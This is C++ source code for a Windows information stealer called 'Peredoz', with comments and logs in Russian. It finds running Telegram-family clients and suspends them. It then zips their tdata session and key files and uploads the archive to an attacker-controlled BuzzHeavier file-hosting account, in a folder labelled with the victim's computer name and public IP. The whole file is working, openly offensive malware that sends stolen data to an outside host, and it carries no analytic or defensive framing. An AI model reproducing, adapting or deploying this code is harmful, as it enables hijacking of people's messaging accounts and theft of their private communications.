#include <Windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <thread>
#include <chrono>
#include <iomanip>
#include <wininet.h>
#include <shlwapi.h>
#include <algorithm>
#include <regex>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")

#include "miniz.h"

const std::string BUZZHEAVIER_ACCOUNT_ID = "ABCD6767"; // https://buzzheavier.com/settings copy Account id in User Settings section

const std::vector<std::string> BUZZHEAVIER_MIRRORS = {
    "buzzheavier.com",
    "bzzhr.co",
    "fuckingfast.net"
};

class FileSystemHelper {
public:
    static bool Exists(const std::string& path) {
        DWORD attr = GetFileAttributesA(path.c_str());
        return (attr != INVALID_FILE_ATTRIBUTES);
    }

    static bool IsDirectory(const std::string& path) {
        DWORD attr = GetFileAttributesA(path.c_str());
        return (attr != INVALID_FILE_ATTRIBUTES) && (attr & FILE_ATTRIBUTE_DIRECTORY);
    }

    static std::string GetParentPath(const std::string& path) {
        char drive[_MAX_DRIVE];
        char dir[_MAX_DIR];
        char fname[_MAX_FNAME];
        char ext[_MAX_EXT];

        _splitpath_s(path.c_str(), drive, _MAX_DRIVE, dir, _MAX_DIR, fname, _MAX_FNAME, ext, _MAX_EXT);

        char result[_MAX_PATH];
        _makepath_s(result, _MAX_PATH, drive, dir, "", "");

        std::string parentPath(result);
        if (!parentPath.empty() && (parentPath.back() == '\\' || parentPath.back() == '/')) {
            parentPath.pop_back();
        }
        return parentPath;
    }

    static std::vector<std::string> GetFilesInDirectory(const std::string& directory) {
        std::vector<std::string> files;
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA((directory + "\\*").c_str(), &findData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                    files.push_back(findData.cFileName);
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }
        return files;
    }
};

class BuzzHeavierAPI {
private:
    std::string accountId;
    std::string currentMirror;
    std::string uploadUrl;
    std::string apiUrl;

    struct Response {
        int statusCode;
        std::string body;
        bool success;
    };

    bool testMirror(const std::string& mirror) {
        std::string testUrl = "https://" + mirror + "/api/locations";

        HINTERNET hInternet = InternetOpenA("BuzzHeavierAPI/1.0",
            INTERNET_OPEN_TYPE_DIRECT,
            NULL, NULL, 0);
        if (!hInternet) return false;

        HINTERNET hConnect = InternetOpenUrlA(hInternet, testUrl.c_str(), NULL, 0,
            INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);

        bool success = false;
        if (hConnect) {
            DWORD statusCode = 0;
            DWORD statusCodeSize = sizeof(statusCode);
            if (HttpQueryInfoA(hConnect, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                &statusCode, &statusCodeSize, NULL)) {
                success = (statusCode >= 200 && statusCode < 400);
            }
            InternetCloseHandle(hConnect);
        }

        InternetCloseHandle(hInternet);
        return success;
    }

    bool findWorkingMirror() {
        for (const auto& mirror : BUZZHEAVIER_MIRRORS) {
            if (testMirror(mirror)) {
                currentMirror = mirror;
                uploadUrl = "https://w." + mirror + "/";
                apiUrl = "https://" + mirror + "/api/";
                return true;
            }
        }
        return false;
    }

    Response httpRequest(const std::string& url, const std::string& method,
        const std::vector<char>& data = {},
        const std::string& contentType = "application/json",
        bool useAuth = false) {
        Response resp = { 0, "", false };

        URL_COMPONENTSA urlComp;
        ZeroMemory(&urlComp, sizeof(urlComp));
        urlComp.dwStructSize = sizeof(urlComp);

        char szHostName[256];
        char szUrlPath[1024];

        urlComp.lpszHostName = szHostName;
        urlComp.dwHostNameLength = sizeof(szHostName);
        urlComp.lpszUrlPath = szUrlPath;
        urlComp.dwUrlPathLength = sizeof(szUrlPath);

        if (!InternetCrackUrlA(url.c_str(), 0, 0, &urlComp)) {
            return resp;
        }

        HINTERNET hInternet = InternetOpenA("BuzzHeavierAPI/1.0",
            INTERNET_OPEN_TYPE_DIRECT,
            NULL, NULL, 0);
        if (!hInternet) return resp;

        HINTERNET hConnect = InternetConnectA(hInternet, szHostName,
            urlComp.nPort,
            NULL, NULL,
            INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return resp;
        }

        DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
        if (urlComp.nPort == INTERNET_DEFAULT_HTTPS_PORT) {
            flags |= INTERNET_FLAG_SECURE;
        }

        HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(),
            szUrlPath, NULL, NULL, NULL,
            flags, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return resp;
        }

        std::string headers = "Content-Type: " + contentType + "\r\n";
        if (useAuth) {
            headers += "Authorization: Bearer " + accountId + "\r\n";
        }

        BOOL result;
        if (method == "GET") {
            result = HttpSendRequestA(hRequest, headers.c_str(), headers.length(), NULL, 0);
        }
        else {
            result = HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
                (LPVOID)data.data(), data.size());
        }

        if (result) {
            DWORD statusCode = 0;
            DWORD statusCodeSize = sizeof(statusCode);
            HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                &statusCode, &statusCodeSize, NULL);
            resp.statusCode = statusCode;

            char buffer[4096];
            DWORD bytesRead;
            while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead) {
                resp.body.append(buffer, bytesRead);
            }

            resp.success = (statusCode >= 200 && statusCode < 300);
        }

        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);

        return resp;
    }

    std::string findExistingFolderId(const std::string& rootResponse, const std::string& folderName) {
        try {
            size_t childrenPos = rootResponse.find("\"children\":[");
            if (childrenPos == std::string::npos) {
                return "";
            }

            size_t start = childrenPos + 12;
            size_t end = rootResponse.find("]", start);
            if (end == std::string::npos) {
                return "";
            }

            std::string childrenStr = rootResponse.substr(start, end - start);

            std::vector<std::string> items;
            size_t itemStart = 0;
            int braceCount = 0;

            for (size_t i = 0; i < childrenStr.length(); i++) {
                if (childrenStr[i] == '{') {
                    braceCount++;
                    if (braceCount == 1) {
                        itemStart = i;
                    }
                }
                else if (childrenStr[i] == '}') {
                    braceCount--;
                    if (braceCount == 0) {
                        items.push_back(childrenStr.substr(itemStart, i - itemStart + 1));
                    }
                }
            }

            for (const auto& item : items) {
                size_t namePos = item.find("\"name\":\"");
                if (namePos == std::string::npos) continue;

                namePos += 8;
                size_t nameEnd = item.find("\"", namePos);
                if (nameEnd == std::string::npos) continue;

                std::string currentName = item.substr(namePos, nameEnd - namePos);

                if (currentName == folderName) {
                    size_t idPos = item.find("\"id\":\"");
                    if (idPos == std::string::npos) continue;

                    idPos += 6;
                    size_t idEnd = item.find("\"", idPos);
                    if (idEnd == std::string::npos) continue;

                    return item.substr(idPos, idEnd - idPos);
                }
            }
        }
        catch (...) {
            Log("[BuzzHeavierAPI] Ошибка при парсинге JSON");
        }

        return "";
    }

public:
    BuzzHeavierAPI(const std::string& accountId = "") : accountId(accountId) {
        if (!findWorkingMirror()) {
            currentMirror = BUZZHEAVIER_MIRRORS[0];
            uploadUrl = "https://w." + currentMirror + "/";
            apiUrl = "https://" + currentMirror + "/api/";
        }
    }

    std::string getCurrentMirror() const {
        return currentMirror;
    }

    std::string createDirectory(const std::string& parentId, const std::string& name) {
        std::string url = apiUrl + "fs/" + parentId;
        std::string json = "{\"name\":\"" + name + "\"}";
        std::vector<char> data(json.begin(), json.end());

        Response resp = httpRequest(url, "POST", data, "application/json", true);

        if (!resp.success) {
            for (const auto& mirror : BUZZHEAVIER_MIRRORS) {
                if (mirror == currentMirror) continue;

                uploadUrl = "https://w." + mirror + "/";
                apiUrl = "https://" + mirror + "/api/";

                url = apiUrl + "fs/" + parentId;
                resp = httpRequest(url, "POST", data, "application/json", true);

                if (resp.success) {
                    currentMirror = mirror;
                    break;
                }
            }
        }

        return resp.success ? resp.body : "";
    }

    std::string getRootDirectory() {
        std::string url = apiUrl + "fs";
        Response resp = httpRequest(url, "GET", {}, "application/json", true);

        if (!resp.success) {
            for (const auto& mirror : BUZZHEAVIER_MIRRORS) {
                if (mirror == currentMirror) continue;

                uploadUrl = "https://w." + mirror + "/";
                apiUrl = "https://" + mirror + "/api/";

                url = apiUrl + "fs";
                resp = httpRequest(url, "GET", {}, "application/json", true);

                if (resp.success) {
                    currentMirror = mirror;
                    break;
                }
            }
        }

        return resp.success ? resp.body : "";
    }

    std::string uploadFileDirect(const std::string& filePath, const std::string& parentId,
        const std::string& fileName) {
        std::ifstream file(filePath, std::ios::binary);
        if (!file) return "";

        std::vector<char> fileData((std::istreambuf_iterator<char>(file)),
            std::istreambuf_iterator<char>());
        file.close();

        std::string url = uploadUrl + parentId + "/" + fileName;
        Response resp = httpRequest(url, "PUT", fileData, "application/octet-stream", true);

        if (!resp.success) {
            for (const auto& mirror : BUZZHEAVIER_MIRRORS) {
                if (mirror == currentMirror) continue;

                uploadUrl = "https://w." + mirror + "/";
                apiUrl = "https://" + mirror + "/api/";

                url = uploadUrl + parentId + "/" + fileName;
                resp = httpRequest(url, "PUT", fileData, "application/octet-stream", true);

                if (resp.success) {
                    currentMirror = mirror;
                    break;
                }
            }
        }

        return resp.success ? resp.body : "";
    }

    std::string getOrCreateFolder(const std::string& rootResponse, const std::string& rootId,
        const std::string& folderName) {
        std::string folderId = findExistingFolderId(rootResponse, folderName);

        if (!folderId.empty()) {
            Log("[BuzzHeavierAPI] Найдена существующая папка: " + folderName + " с ID: " + folderId);
            return folderId;
        }

        Log("[BuzzHeavierAPI] Создаем новую папку: " + folderName);
        std::string createResponse = createDirectory(rootId, folderName);

        if (createResponse.empty()) {
            Log("[BuzzHeavierAPI] Не удалось создать папку: " + folderName);
            return "";
        }

        folderId = extractJsonValue(createResponse, "id");
        if (folderId.empty()) {
            Log("[BuzzHeavierAPI] Не удалось распарсить ID созданной папки");
            return "";
        }

        Log("[BuzzHeavierAPI] Создана новая папка: " + folderName + " с ID: " + folderId);
        return folderId;
    }

    static std::string extractJsonValue(const std::string& json, const std::string& key) {
        std::string searchKey = "\"" + key + "\":\"";
        size_t pos = json.find(searchKey);
        if (pos == std::string::npos) {
            return "";
        }

        pos += searchKey.length();
        size_t endPos = json.find("\"", pos);
        if (endPos == std::string::npos) {
            return "";
        }

        return json.substr(pos, endPos - pos);
    }

    void Log(const std::string& message) {
        // OutputDebugStringA((message + "\n").c_str());
    }
};

const std::string MUTEX_NAME = "Global\\peredoz";

class Peredoz {
private:
    std::string userIP;
    std::string pcName;
    HANDLE hMutex;
    BuzzHeavierAPI api;

    std::string GetCurrentTimeFormatted() {
        auto now = std::chrono::system_clock::now();
        auto in_time_t = std::chrono::system_clock::to_time_t(now);
        std::tm tm;
        localtime_s(&tm, &in_time_t);

        std::ostringstream oss;
        oss << std::put_time(&tm, "%H-%M-%S");
        return oss.str();
    }

    std::string GetCurrentDateTimeFormatted() {
        auto now = std::chrono::system_clock::now();
        auto in_time_t = std::chrono::system_clock::to_time_t(now);
        std::tm tm;
        localtime_s(&tm, &in_time_t);

        std::ostringstream oss;
        oss << std::put_time(&tm, "%Y-%m-%d_%H-%M-%S");
        return oss.str();
    }

public:
    Peredoz() : hMutex(NULL), api(BUZZHEAVIER_ACCOUNT_ID) {}

    void Run() {
        hMutex = CreateMutexA(NULL, FALSE, MUTEX_NAME.c_str());
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            Log("Программа уже запущена");
            return;
        }

        if (!hMutex) {
            Log("Ошибка создания мьютекса");
            return;
        }

        auto start = std::chrono::steady_clock::now();

        Log("Используется зеркало: " + api.getCurrentMirror());

        if (!GetUserIP()) {
            Log("Ошибка получения IP");
            Cleanup();
            return;
        }

        if (!GetPCName()) {
            Log("Ошибка получения имени ПК");
            Cleanup();
            return;
        }

        std::vector<std::string> processes = {
            "Telegram", "AyuGram", "Kotatogram", "iMe"
        };

        bool anySuccess = false;
        std::string timestamp = GetCurrentDateTimeFormatted();

        for (auto& proc : processes) {
            std::string path = FindProcessPath(proc);
            if (!path.empty()) {
                std::string clientPath = FileSystemHelper::GetParentPath(path);
                Log("Найден процесс: " + proc + " по пути: " + path);
                if (GrabData(proc, clientPath, timestamp)) {
                    anySuccess = true;
                    auto end = std::chrono::steady_clock::now();
                    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(end - start);
                    Log("Успешно обработан: " + proc + " за " + std::to_string(elapsed.count()) + "s");
                }
            }
        }

        Cleanup();
    }

private:
    void Cleanup() {
        if (hMutex) {
            CloseHandle(hMutex);
            hMutex = NULL;
        }
    }

    bool GetPCName() {
        char buffer[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(buffer);

        if (GetComputerNameA(buffer, &size)) {
            pcName = std::string(buffer);
            Log("Имя ПК: " + pcName);
            return true;
        }
        return false;
    }

    bool GetUserIP() {
        HINTERNET hInternet = InternetOpenA("IP Checker", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return false;

        HINTERNET hConnect = InternetOpenUrlA(hInternet, "https://wtfismyip.com/text", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return false;
        }

        char buffer[1024];
        DWORD bytesRead;
        std::string result;

        while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            result.append(buffer, bytesRead);
        }

        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);

        userIP = result;
        userIP.erase(std::remove_if(userIP.begin(), userIP.end(),
            [](char c) { return c == '\r' || c == '\n' || c == ' '; }), userIP.end());

        Log("IP: " + userIP);
        return !userIP.empty();
    }

    std::string FindProcessPath(const std::string& processName) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return "";

        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);

        if (!Process32First(hSnapshot, &pe)) {
            CloseHandle(hSnapshot);
            return "";
        }

        std::string result;
        do {
            std::wstring exeFile(pe.szExeFile);
            std::string currentProcess(exeFile.begin(), exeFile.end());

            if (_stricmp(currentProcess.c_str(), (processName + ".exe").c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    wchar_t path[MAX_PATH];
                    DWORD size = MAX_PATH;
                    if (QueryFullProcessImageNameW(hProcess, 0, path, &size)) {
                        std::wstring wpath(path);
                        result = std::string(wpath.begin(), wpath.end());
                    }
                    CloseHandle(hProcess);
                }
                break;
            }
        } while (Process32Next(hSnapshot, &pe));

        CloseHandle(hSnapshot);
        return result;
    }

    bool GrabData(const std::string& proc, const std::string& clientPath, const std::string& timestamp) {
        DWORD pid = GetProcessIdByName(proc);
        if (pid == 0) {
            Log("Не удалось получить PID: " + proc);
            return false;
        }

        Log("Замораживаем процесс " + proc);
        if (!FreezeProcess(pid)) {
            Log("Не удалось заморозить: " + proc);
            return false;
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(700));

        bool success = false;
        std::string tdataPath = clientPath + "\\tdata";

        char currentDir[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, currentDir);

        if (SetCurrentDirectoryA(tdataPath.c_str())) {
            Log("Перешли в tdata: " + tdataPath);
            std::vector<std::string> files = CollectFiles();
            Log("Найдено файлов: " + std::to_string(files.size()));

            if (!files.empty()) {
                std::string zipPath = proc + "_tdata_" + timestamp + ".zip";
                if (CreateZipArchive(files, zipPath)) {
                    Log("Архив создан: " + zipPath);
                    UploadToBuzzHeavier(zipPath, proc, timestamp);
                    success = true;
                }
                DeleteFileA(zipPath.c_str());
            }

            SetCurrentDirectoryA(currentDir);
        }

        Log("Размораживаем процесс " + proc);
        UnfreezeProcess(pid);
        return success;
    }

    DWORD GetProcessIdByName(const std::string& processName) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);

        if (!Process32First(hSnapshot, &pe)) {
            CloseHandle(hSnapshot);
            return 0;
        }

        DWORD result = 0;
        do {
            std::wstring exeFile(pe.szExeFile);
            std::string currentProcess(exeFile.begin(), exeFile.end());

            if (_stricmp(currentProcess.c_str(), (processName + ".exe").c_str()) == 0) {
                result = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));

        CloseHandle(hSnapshot);
        return result;
    }

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

    bool FreezeProcess(DWORD pid) {
        HANDLE hProcess = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
        if (!hProcess) return false;

        typedef NTSTATUS(NTAPI* pNtSuspendProcess)(HANDLE);
        pNtSuspendProcess NtSuspendProcess = (pNtSuspendProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSuspendProcess");

        bool success = NtSuspendProcess && NT_SUCCESS(NtSuspendProcess(hProcess));
        CloseHandle(hProcess);
        return success;
    }

    bool UnfreezeProcess(DWORD pid) {
        HANDLE hProcess = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
        if (!hProcess) return false;

        typedef NTSTATUS(NTAPI* pNtResumeProcess)(HANDLE);
        pNtResumeProcess NtResumeProcess = (pNtResumeProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtResumeProcess");

        bool success = NtResumeProcess && NT_SUCCESS(NtResumeProcess(hProcess));
        CloseHandle(hProcess);
        return success;
    }

    std::vector<std::string> CollectFiles() {
        std::vector<std::string> neededFiles;

        if (FileSystemHelper::Exists("key_datas")) {
            neededFiles.push_back("key_datas");
            Log("Добавлен key_datas");
        }

        auto entries = FileSystemHelper::GetFilesInDirectory(".");
        for (const auto& entry : entries) {
            if (FileSystemHelper::IsDirectory(entry)) {
                std::string dirName = entry;
                std::string correspondingFile = dirName + "s";

                if (FileSystemHelper::Exists(correspondingFile)) {
                    neededFiles.push_back(correspondingFile);
                    Log("Добавлен: " + correspondingFile);

                    std::string mapsPath = dirName + "\\maps";
                    if (FileSystemHelper::Exists(mapsPath)) {
                        neededFiles.push_back(mapsPath);
                        Log("Добавлен maps: " + dirName);
                    }
                }
            }
        }

        Log("Файлов: " + std::to_string(neededFiles.size()));
        return neededFiles;
    }

    bool CreateZipArchive(const std::vector<std::string>& files, const std::string& zipPath) {
        mz_zip_archive zip_archive;
        memset(&zip_archive, 0, sizeof(zip_archive));

        if (!mz_zip_writer_init_file(&zip_archive, zipPath.c_str(), 0)) {
            return false;
        }

        int addedCount = 0;
        for (auto& file : files) {
            if (AddFileToZip(&zip_archive, file, file)) {
                addedCount++;
            }
        }

        if (addedCount == 0) {
            mz_zip_writer_end(&zip_archive);
            return false;
        }

        if (!mz_zip_writer_finalize_archive(&zip_archive)) {
            mz_zip_writer_end(&zip_archive);
            return false;
        }

        mz_zip_writer_end(&zip_archive);
        return true;
    }

    bool AddFileToZip(mz_zip_archive* zip_archive, const std::string& filePath, const std::string& zipPath) {
        std::ifstream file(filePath, std::ios::binary | std::ios::ate);
        if (!file) return false;

        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);

        if (size == 0) return false;

        std::vector<char> fileData(size);
        if (!file.read(fileData.data(), size)) return false;

        std::string normalizedPath = zipPath;
        std::replace(normalizedPath.begin(), normalizedPath.end(), '\\', '/');

        if (!mz_zip_writer_add_mem(zip_archive, normalizedPath.c_str(), fileData.data(), fileData.size(), MZ_BEST_COMPRESSION)) {
            return false;
        }

        return true;
    }

    void UploadToBuzzHeavier(const std::string& zipPath, const std::string& proc, const std::string& timestamp) {
        Log("Загрузка на BuzzHeavier...");
        Log("Текущее зеркало: " + api.getCurrentMirror());

        std::string rootResponse = api.getRootDirectory();
        if (rootResponse.empty()) {
            Log("Не удалось получить root directory");
            return;
        }

        std::string rootId = BuzzHeavierAPI::extractJsonValue(rootResponse, "id");
        if (rootId.empty()) {
            Log("Не удалось распарсить root ID");
            return;
        }

        Log("Root ID: " + rootId);

        std::string folderName = pcName + "_" + userIP;
        Log("Ищем или создаём папку: " + folderName);

        std::string folderId = api.getOrCreateFolder(rootResponse, rootId, folderName);
        if (folderId.empty()) {
            Log("Не удалось получить ID папки");
            return;
        }

        Log("Folder ID: " + folderId);

        std::string fileName = proc + "_tdata_" + timestamp + ".zip";
        Log("Загружаем файл: " + fileName);

        std::string uploadResponse = api.uploadFileDirect(zipPath, folderId, fileName);

        if (!uploadResponse.empty()) {
            Log("Успешно загружено: " + proc);
            Log("Использовано зеркало: " + api.getCurrentMirror());
        }
        else {
            Log("Ошибка загрузки: " + proc);
        }
    }

    void Log(const std::string& message) {
        // OutputDebugStringA(("[Peredoz] " + message + "\n").c_str());
    }
};

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    Peredoz stealer;
    stealer.Run();
    return 0;
}